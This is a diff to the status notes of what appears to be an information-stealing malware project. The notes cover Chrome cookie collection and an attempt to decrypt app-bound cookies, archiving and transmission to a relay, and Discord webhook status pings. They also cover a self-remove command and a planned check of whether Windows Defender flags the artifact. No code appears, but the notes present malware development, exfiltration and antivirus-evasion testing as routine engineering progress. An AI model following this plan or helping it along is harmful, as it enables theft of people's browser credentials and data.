@@ -88,8 +88,8 @@ Four gate-table rows were folded rather than omitted, each named in `DECISIONS.m
 `theme/__init__.py` into `app/main.py`, and `model.py` into `app/worker.py` plus
 `core/validate.py`. That is why `app/` is 14 slots and not 18.
 
-Nothing is open. The frozen launcher now exists and is proven (§9). What remains is not
-code: one VM run.
+Nothing is open. The frozen launcher now exists and is proven (§9). The results of a run
+can be read in place when `keep_local` is on. What remains is not code: one VM run.
 
 ---
 
@@ -97,10 +97,10 @@ code: one VM run.
 
 Nothing below is a claim; each line is a test that ran on Windows 11, CPython 3.12.10.
 
-- `pytest` — **181 passed**. Manifest parity both directions, AST import direction,
+- `pytest` — **187 passed**. Manifest parity both directions, AST import direction,
   config error paths, archive assembly, relay delivery, status webhook pings, the
-  readable caption block, link-host fallback, self-remove command shape, and the four
-  inter-module contracts.
+  readable caption block, link-host fallback, the local copy helper, self-remove command
+  shape, and the four inter-module contracts.
 - `ruff check .` — clean, with `E`, `F`, `W`, `I`, `B`, `UP`, `SIM`, `RUF` enabled.
 - `compileall` — clean over `agent/`, `core/`, `app/`, `tests/`, `tools/`.
 - **Seal ↔ loader, both halves.** `core/seal.py` seals, `agent/loader.py` opens; wrong
@@ -140,6 +140,11 @@ Nothing below is a claim; each line is a test that ran on Windows 11, CPython 3.
   built wheel carries `agent`, `core`, `app`, both `.qss` files and the entry point.
 - **Live Chrome, unelevated and elevated.** Six v20 cookies found, zero decrypted.
   That is the app-bound wall, not a bug — see §8.
+- **Local copy, live.** An artifact built with `keep_local=True` wrote
+  `Documents\Sable Results\KUZE_20261120-003229.zip` — SHA-256 identical to the archive
+  the relay received — plus a UTF-8 `.txt` summary beside it, and posted the path to the
+  status webhook before uploading. Default stays off; the four helper behaviours
+  (naming, illegal characters, blocked folder, no overwrite) are unit-tested.
 
 ---
 
@@ -272,7 +277,9 @@ No code is owed. In order:
 
 1. Run one artifact in a throwaway VM against a relay you control: Defender's verdict,
    collection, transmit, and `self_remove` if it is switched on. That is the last check.
-2. Only then decide whether the two deliberately-unfixed items in §9 matter.
+2. Prove the status webhook against a real Discord channel — the caption, the mention and
+   the `local copy` line have only been seen on a local receiver.
+3. Only then decide whether the two deliberately-unfixed items in §9 matter.
 
 Streaming multipart is still the one real limitation: `relay.transmit` loads the
 archive into memory twice, which is fine at 440 MB and wrong at 2 GB. The `link` relay
